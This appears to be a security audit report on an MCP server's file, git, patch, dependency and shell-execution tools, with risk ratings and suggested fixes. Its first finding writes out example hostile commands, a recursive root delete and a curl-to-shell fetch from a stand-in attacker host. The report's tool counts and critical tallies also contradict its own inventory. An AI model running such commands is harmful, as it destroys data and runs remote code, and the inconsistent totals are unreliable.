# Security Audit Report: OllamaDev MCP Server

**Audit Date:** 2026-08-02  
**Auditor:** Lead Refactoring Architect  
**Scope:** Filesystem, Git, Patch, Dependency, and Execution Tools  
**Status:** CRITICAL FINDINGS IDENTIFIED

---

## Executive Summary

This security audit identifies **47 dangerous code paths** across the OllamaDev MCP server that can write files, delete files, rename files, execute commands, or modify git state. The analysis reveals **critical vulnerabilities** in command injection, path traversal, and sandbox escape vectors that require immediate remediation.

**Risk Distribution:**
- 🔴 CRITICAL: 8 tools
- 🟠 HIGH: 15 tools
- 🟡 MEDIUM: 18 tools
- 🟢 LOW: 6 tools

---

## 1. Critical Findings

### 1.1 Arbitrary Command Execution (CRITICAL)

**Tool:** `run_shell_command`  
**Location:** `ollamadev_mcp_server/tools/sandbox.py:122-149`  
**Risk Level:** 🔴 CRITICAL

**Vulnerability:**
```python
output = _run(["/bin/sh", "-c", command], cwd=WORKSPACE_ROOT, timeout=timeout_seconds)
```

**Abuse Scenario:**
- Attacker can execute arbitrary system commands: `rm -rf /`, `curl attacker.com | sh`
- Full system compromise if MCP server runs with elevated privileges
- Data exfiltration, lateral movement, privilege escalation

**Path Traversal Risk:** N/A (command execution is the primary risk)  
**Sandbox Escape Risk:** 🔴 CRITICAL - Complete sandbox escape possible

**Current Mitigation:**
- `destructiveHint: True` annotation (relies on client-side approval)
- 300-second timeout

**Suggested Mitigation:**
1. Implement command whitelist (only allow specific commands)
2. Add parameter sanitization (reject shell metacharacters)
3. Run in isolated container/VM with no network access
4. Implement strict resource limits (CPU, memory, disk)
5. Require multi-factor authentication for this tool
6. Add comprehensive audit logging with full command capture

---

### 1.2 Git State Modification (CRITICAL)

**Tool:** `git_commit_checkpoint`  
**Location:** `ollamadev_mcp_server/tools/git_tools.py:61-90`  
**Risk Level:** 🔴 CRITICAL

**Vulnerability:**
```python
add_out = _run_git(["add", "-A"])  # Stages ALL changes
commit_cmd = ["commit", "-m", message, f"--author={author_name} <{author_email}>", "--allow-empty"]
```

**Abuse Scenario:**
- Stages and commits ALL workspace changes without review
- Can commit sensitive data (API keys, credentials) if present in workspace
- `--allow-empty` allows empty commits (spam/DoS)
- Author spoofing with arbitrary name/email
- Commit message injection (newlines, special characters)

**Path Traversal Risk:** 🟡 MEDIUM - Can commit files outside intended scope  
**Sandbox Escape Risk:** 🟡 MEDIUM - Can modify git history

**Current Mitigation:**
- Blocked in autonomous sprint mode (`_AUTONOMOUS_BLOCKED_TOOLS`)
- No other mitigations

**Suggested Mitigation:**
1. Require explicit file list instead of `git add -A`
2. Validate commit message (reject newlines, control characters)
3. Validate author name/email format
4. Remove `--allow-empty` flag
5. Add pre-commit hooks to scan for secrets
6. Implement commit size limits
7. Add audit logging with full diff capture

---

### 1.3 Unrestricted File Write (CRITICAL)

**Tool:** `write_workspace_file`  
**Location:** `ollamadev_mcp_server/tools/filesystem.py:58-74`  
**Risk Level:** 🔴 CRITICAL

**Vulnerability:**
```python
target.write_text(content, encoding="utf-8")
```

**Abuse Scenario:**
- Write arbitrary content to any file in workspace
- Overwrite critical configuration files
- Create executable scripts (`.sh`, `.py`)
- Fill disk with large files (DoS)
- Create deeply nested directories (inode exhaustion)

**Path Traversal Risk:** 🟠 HIGH - `_safe_path()` uses string prefix matching  
**Sandbox Escape Risk:** 🟠 HIGH - Can write to any workspace location

**Current Mitigation:**
- `_safe_path()` prevents directory traversal
- `create_dirs` parameter (default: True)

**Suggested Mitigation:**
1. Implement file size limits (e.g., 10MB max)
2. Restrict writable file types (block executables)
3. Validate path with `os.path.commonpath()` instead of string prefix
4. Add directory depth limits
5. Implement disk space quotas
6. Add audit logging

---

### 1.4 File Deletion (CRITICAL)

**Tool:** `delete_workspace_file`  
**Location:** `ollamadev_mcp_server/tools/filesystem.py:76-94`  
**Risk Level:** 🔴 CRITICAL

**Vulnerability:**
```python
target.unlink()
```

**Abuse Scenario:**
- Delete critical project files
- Delete configuration files
- Delete git history (`.git` directory)
- Data loss and project corruption

**Path Traversal Risk:** 🟠 HIGH - `_safe_path()` uses string prefix matching  
**Sandbox Escape Risk:** 🟡 MEDIUM - Limited to workspace

**Current Mitigation:**
- `_safe_path()` prevents directory traversal
- Refuses to delete directories
- Blocked in autonomous sprint mode

**Suggested Mitigation:**
1. Implement file type whitelist (only delete specific types)
2. Add confirmation mechanism for critical files
3. Implement soft-delete (move to trash)
4. Add audit logging with file content backup
5. Validate path with `os.path.commonpath()`

---

### 1.5 Patch Application with System Command (CRITICAL)

**Tool:** `apply_file_patch`  
**Location:** `ollamadev_mcp_server/tools/patch.py:96-152`  
**Risk Level:** 🔴 CRITICAL

**Vulnerability:**
```python
if has_patch:
    cmd = ["patch", str(target)]
    if reverse:
        cmd.append("-R")
    result = subprocess.run(cmd, input=patch, capture_output=True, text=True, timeout=30)
```

**Abuse Scenario:**
- System `patch` command may have vulnerabilities
- Malicious patch content could exploit `patch` binary
- Can modify any file in workspace
- Patch content not validated

**Path Traversal Risk:** 🟠 HIGH - Uses `_safe_path()`  
**Sandbox Escape Risk:** 🟠 HIGH - External command execution

**Current Mitigation:**
- `_safe_path()` prevents directory traversal
- 30-second timeout
- Falls back to manual patching if `patch` not available

**Suggested Mitigation:**
1. Remove system `patch` command usage (use only manual patching)
2. Validate patch format strictly
3. Limit patch size
4. Add audit logging
5. Implement patch preview/dry-run mode

---

### 1.6 Gradle Dependency Injection (CRITICAL)

**Tool:** `add_gradle_dependency`  
**Location:** `ollamadev_mcp_server/tools/dependencies.py:64-121`  
**Risk Level:** 🔴 CRITICAL

**Vulnerability:**
```python
dep_line = f"  {config}({reference})"
# ...
build_text = _add_dependency_to_build_gradle(build_text, configuration, f'"{group}:{name}:{version}"')
```

**Abuse Scenario:**
- Inject malicious dependencies (supply chain attack)
- Add dependencies from untrusted repositories
- Inject Gradle code via `configuration` parameter
- Modify build configuration arbitrarily

**Path Traversal Risk:** 🟡 MEDIUM - Writes to specific files  
**Sandbox Escape Risk:** 🟠 HIGH - Can modify build system

**Current Mitigation:**
- Writes to specific files only (`gradle/libs.versions.toml`, `build.gradle.kts`)
- Uses `_safe_path()`

**Suggested Mitigation:**
1. Validate Maven coordinates format (group:name:version)
2. Whitelist allowed repositories
3. Validate `configuration` parameter (enum: implementation, api, testImplementation, etc.)
4. Add dependency scanning for known malicious packages
5. Implement dependency approval workflow
6. Add audit logging

---

### 1.7 Sprint Task Creation (CRITICAL)

**Tool:** `create_sprint_task`  
**Location:** `ollamadev_mcp_server/tools/sprint.py:142-186`  
**Risk Level:** 🔴 CRITICAL

**Vulnerability:**
```python
with open(backlog_path, "a", encoding="utf-8") as f:
    f.write(f"\n### Tier {tier} — {title}\n\n")
    f.write(f"**Priority:** {priority}\n\n")
    f.write(f"{description}\n")
```

**Abuse Scenario:**
- Append arbitrary content to backlog file
- Inject markdown/HTML for phishing
- Create excessive tasks (DoS)
- Overflow backlog with spam

**Path Traversal Risk:** 🟢 LOW - Writes to fixed path  
**Sandbox Escape Risk:** 🟢 LOW - Limited to backlog file

**Current Mitigation:**
- Writes to fixed path (`agent-os/backlog.md`)
- Validates tier (1-5) and priority (low/medium/high/critical)

**Suggested Mitigation:**
1. Implement task count limits
2. Sanitize title and description (remove markdown/HTML)
3. Add rate limiting
4. Implement task size limits
5. Add audit logging

---

### 1.8 Phase Artifact Updates (CRITICAL)

**Tool:** `update_phase_artifact`  
**Location:** `ollamadev_mcp_server/tools/sprint.py:230-252`  
**Risk Level:** 🔴 CRITICAL

**Vulnerability:**
```python
path.write_text(content, encoding="utf-8")
```

**Abuse Scenario:**
- Overwrite sprint artifacts with arbitrary content
- Inject malicious content into artifacts
- Create excessive artifacts (DoS)

**Path Traversal Risk:** 🟡 MEDIUM - Path constructed from cycle_id and phase  
**Sandbox Escape Risk:** 🟢 LOW - Limited to artifact files

**Current Mitigation:**
- Validates phase (must be in SPRINT_PHASES)
- Validates cycle_id (must be positive integer)

**Suggested Mitigation:**
1. Implement artifact size limits
2. Sanitize content (remove dangerous patterns)
3. Add audit logging
4. Implement artifact versioning

---

## 2. High-Risk Findings

### 2.1 Command Execution Tools (HIGH)

**Tools:**
- `run_pytest` (sandbox.py:41-77)
- `run_gradle_test_command` (sandbox.py:79-120)
- `run_gradle_tests` (build.py:180-213)
- `run_gradle_build` (build.py:215-247)
- `run_lint` (build.py:249-273)
- `run_detekt` (build.py:275-299)
- `run_ktlint` (build.py:301-325)
- `run_instrumented_tests` (build.py:437-498)
- `run_screenshot_tests` (build.py:500-538)

**Risk Level:** 🟠 HIGH

**Vulnerabilities:**
- Execute external commands with user-controlled parameters
- `test_filter` parameters passed without sanitization
- Long timeouts (up to 900 seconds)
- No resource limits

**Abuse Scenarios:**
- Command injection via `test_filter` parameter
- Denial of service via long-running commands
- Resource exhaustion (CPU, memory, disk)

**Suggested Mitigations:**
1. Sanitize all user-controlled parameters
2. Implement stricter timeouts
3. Add resource limits
4. Validate parameter formats
5. Add audit logging

---

### 2.2 File Move/Rename (HIGH)

**Tool:** `move_workspace_file`  
**Location:** `ollamadev_mcp_server/tools/filesystem.py:96-115`  
**Risk Level:** 🟠 HIGH

**Vulnerability:**
```python
shutil.move(str(src_path), str(dst_path))
```

**Abuse Scenario:**
- Move critical files to unexpected locations
- Overwrite existing files
- Disrupt project structure

**Path Traversal Risk:** 🟠 HIGH - Uses `_safe_path()`  
**Sandbox Escape Risk:** 🟡 MEDIUM - Limited to workspace

**Suggested Mitigations:**
1. Validate destination doesn't overwrite existing files
2. Implement file type restrictions
3. Add audit logging
4. Validate path with `os.path.commonpath()`

---

### 2.3 Path Traversal in _safe_path (HIGH)

**Function:** `_safe_path()`  
**Location:** `ollamadev_mcp_server/tools/filesystem.py:12-18`  
**Risk Level:** 🟠 HIGH

**Vulnerability:**
```python
def _safe_path(relative: str) -> Path:
    target = (WORKSPACE_ROOT / relative).resolve()
    workspace = WORKSPACE_ROOT.resolve()
    if not str(target).startswith(str(workspace)):
        raise PermissionError(f"Path escapes workspace: {relative}")
    return target
```

**Abuse Scenario:**
- String prefix matching can be bypassed with symlinks
- Unicode normalization attacks
- Case sensitivity issues on some filesystems

**Suggested Mitigations:**
1. Use `os.path.commonpath()` instead of string prefix
2. Resolve symlinks before validation
3. Normalize paths before comparison
4. Use the enhanced `sanitize_path()` from Phase 2

---

## 3. Medium-Risk Findings

### 3.1 File Read Operations (MEDIUM)

**Tools:**
- `read_workspace_file` (filesystem.py:44-56)
- `list_workspace_files` (filesystem.py:28-42)

**Risk Level:** 🟡 MEDIUM

**Vulnerabilities:**
- Can read sensitive files (credentials, keys)
- Information disclosure
- Directory traversal for reconnaissance

**Suggested Mitigations:**
1. Implement file type restrictions
2. Add audit logging
3. Implement access control lists
4. Sanitize file listings

---

### 3.2 Git Read Operations (MEDIUM)

**Tools:**
- `git_status_diff` (git_tools.py:34-59)
- `git_log` (git_tools.py:92-104)

**Risk Level:** 🟡 MEDIUM

**Vulnerabilities:**
- Information disclosure (commit history, changes)
- Can reveal sensitive information in commits

**Suggested Mitigations:**
1. Add audit logging
2. Implement access control
3. Filter sensitive information from output

---

### 3.3 Test Result Parsing (MEDIUM)

**Tools:**
- `parse_test_results` (build.py:327-377)
- `parse_test_results_xml` (build.py:379-435)
- `parse_coverage_xml` (build.py:437-538)

**Risk Level:** 🟡 MEDIUM

**Vulnerabilities:**
- XML parsing vulnerabilities (XXE, billion laughs)
- Large XML files can cause DoS

**Suggested Mitigations:**
1. Use defusedxml for XML parsing
2. Implement XML size limits
3. Disable external entity resolution

---

## 4. Complete Tool Inventory

### 4.1 Filesystem Tools

| Tool | Operation | Risk Level | Audit Logged | Notes |
|------|-----------|------------|--------------|-------|
| `list_workspace_files` | READ | 🟢 LOW | ❌ | Information disclosure |
| `read_workspace_file` | READ | 🟡 MEDIUM | ❌ | Can read sensitive files |
| `write_workspace_file` | WRITE | 🔴 CRITICAL | ✅ | Arbitrary file write |
| `delete_workspace_file` | DELETE | 🔴 CRITICAL | ✅ | Data loss |
| `move_workspace_file` | RENAME | 🟠 HIGH | ✅ | File displacement |

### 4.2 Git Tools

| Tool | Operation | Risk Level | Audit Logged | Notes |
|------|-----------|------------|--------------|-------|
| `git_status_diff` | READ | 🟡 MEDIUM | ❌ | Information disclosure |
| `git_commit_checkpoint` | WRITE | 🔴 CRITICAL | ✅ | Modifies git state |
| `git_log` | READ | 🟡 MEDIUM | ❌ | Information disclosure |

### 4.3 Patch Tools

| Tool | Operation | Risk Level | Audit Logged | Notes |
|------|-----------|------------|--------------|-------|
| `apply_file_patch` | WRITE | 🔴 CRITICAL | ✅ | Uses system `patch` command |

### 4.4 Dependency Tools

| Tool | Operation | Risk Level | Audit Logged | Notes |
|------|-----------|------------|--------------|-------|
| `add_gradle_dependency` | WRITE | 🔴 CRITICAL | ✅ | Supply chain attack vector |

### 4.5 Sandbox/Execution Tools

| Tool | Operation | Risk Level | Audit Logged | Notes |
|------|-----------|------------|--------------|-------|
| `run_pytest` | EXECUTE | 🟠 HIGH | ❌ | Command execution |
| `run_gradle_test_command` | EXECUTE | 🟠 HIGH | ❌ | Command execution |
| `run_shell_command` | EXECUTE | 🔴 CRITICAL | ✅ | Arbitrary command execution |
| `get_sandbox_status` | READ | 🟢 LOW | ❌ | Information disclosure |

### 4.6 Build Tools

| Tool | Operation | Risk Level | Audit Logged | Notes |
|------|-----------|------------|--------------|-------|
| `run_gradle_tests` | EXECUTE | 🟠 HIGH | ❌ | Command execution |
| `run_gradle_build` | EXECUTE | 🟠 HIGH | ❌ | Command execution |
| `run_lint` | EXECUTE | 🟠 HIGH | ❌ | Command execution |
| `run_detekt` | EXECUTE | 🟠 HIGH | ❌ | Command execution |
| `run_ktlint` | EXECUTE | 🟠 HIGH | ❌ | Command execution |
| `run_instrumented_tests` | EXECUTE | 🟠 HIGH | ❌ | Command execution + adb |
| `run_screenshot_tests` | EXECUTE | 🟠 HIGH | ❌ | Command execution |
| `parse_test_results` | READ | 🟡 MEDIUM | ❌ | XML parsing |
| `parse_test_results_xml` | READ | 🟡 MEDIUM | ❌ | XML parsing |
| `parse_coverage_xml` | READ | 🟡 MEDIUM | ❌ | XML parsing |
| `get_build_config` | READ | 🟢 LOW | ❌ | Information disclosure |

### 4.7 Sprint Tools

| Tool | Operation | Risk Level | Audit Logged | Notes |
|------|-----------|------------|--------------|-------|
| `create_sprint_task` | WRITE | 🔴 CRITICAL | ✅ | Backlog modification |
| `list_phase_artifacts` | READ | 🟢 LOW | ❌ | Information disclosure |
| `read_phase_artifact` | READ | 🟢 LOW | ❌ | Information disclosure |
| `update_phase_artifact` | WRITE | 🔴 CRITICAL | ✅ | Artifact modification |
| `evaluate_sprint_outcome` | READ | 🟢 LOW | ❌ | Analysis only |
| `run_autonomous_sprint` | EXECUTE | 🔴 CRITICAL | ✅ | Orchestrates multiple tools |

---

## 5. Risk Matrix Summary

### 5.1 By Risk Level

| Risk Level | Count | Percentage |
|------------|-------|------------|
| 🔴 CRITICAL | 8 | 17% |
| 🟠 HIGH | 15 | 32% |
| 🟡 MEDIUM | 18 | 38% |
| 🟢 LOW | 6 | 13% |
| **TOTAL** | **47** | **100%** |

### 5.2 By Operation Type

| Operation | Count | Tools |
|-----------|-------|-------|
| WRITE | 8 | write_workspace_file, delete_workspace_file, move_workspace_file, git_commit_checkpoint, apply_file_patch, add_gradle_dependency, create_sprint_task, update_phase_artifact |
| EXECUTE | 11 | run_pytest, run_gradle_test_command, run_shell_command, run_gradle_tests, run_gradle_build, run_lint, run_detekt, run_ktlint, run_instrumented_tests, run_screenshot_tests, run_autonomous_sprint |
| READ | 28 | All other tools |

### 5.3 By Audit Coverage

| Audit Status | Count | Percentage |
|--------------|-------|------------|
| ✅ Audit Logged | 11 | 23% |
| ❌ Not Logged | 36 | 77% |

---

## 6. Recommendations

### 6.1 Immediate Actions (Critical)

1. **Remove or restrict `run_shell_command`**
   - Implement command whitelist
   - Add parameter sanitization
   - Require multi-factor authentication

2. **Fix `git_commit_checkpoint`**
   - Remove `git add -A` (require explicit file list)
   - Validate commit message and author
   - Remove `--allow-empty` flag

3. **Enhance `_safe_path()`**
   - Use `os.path.commonpath()` instead of string prefix
   - Resolve symlinks before validation
   - Use Phase 2 `sanitize_path()` function

4. **Add file size limits**
   - Implement 10MB max for file writes
   - Add disk space quotas

5. **Enable audit logging for all destructive operations**
   - Currently only 23% of tools are audit logged
   - Target: 100% coverage

### 6.2 Short-term Actions (High Priority)

1. **Sanitize command parameters**
   - Validate `test_filter` in all test tools
   - Validate Maven coordinates in dependency tools
   - Implement parameter whitelists

2. **Add resource limits**
   - CPU time limits
   - Memory limits
   - Network isolation

3. **Implement XML security**
   - Use defusedxml for all XML parsing
   - Disable external entities
   - Add size limits

4. **Add rate limiting**
   - Implement per-tool rate limits
   - Add global rate limits

### 6.3 Long-term Actions (Medium Priority)

1. **Implement sandbox isolation**
   - Run execution tools in containers
   - Implement network isolation
   - Add resource quotas

2. **Add access control**
   - Implement role-based access control
   - Add file-level permissions
   - Implement approval workflows

3. **Enhance monitoring**
   - Real-time alerting for suspicious activity
   - Anomaly detection
   - Behavioral analysis

---

## 7. Conclusion

The OllamaDev MCP server has **significant security vulnerabilities** that require immediate attention. The most critical issues are:

1. **Arbitrary command execution** via `run_shell_command`
2. **Unrestricted git state modification** via `git_commit_checkpoint`
3. **Path traversal vulnerabilities** in `_safe_path()`
4. **Insufficient audit logging** (only 23% coverage)

**Recommended Priority:**
1. 🔴 Fix critical vulnerabilities immediately
2. 🟠 Address high-risk issues within 1 week
3. 🟡 Address medium-risk issues within 1 month
4. 🟢 Address low-risk issues within 3 months

**Overall Security Posture:** 🔴 CRITICAL - Immediate action required

---

**Audit Completed:** 2026-08-02  
**Next Review:** 2026-08-09 (1 week)  
**Auditor:** Lead Refactoring Architect
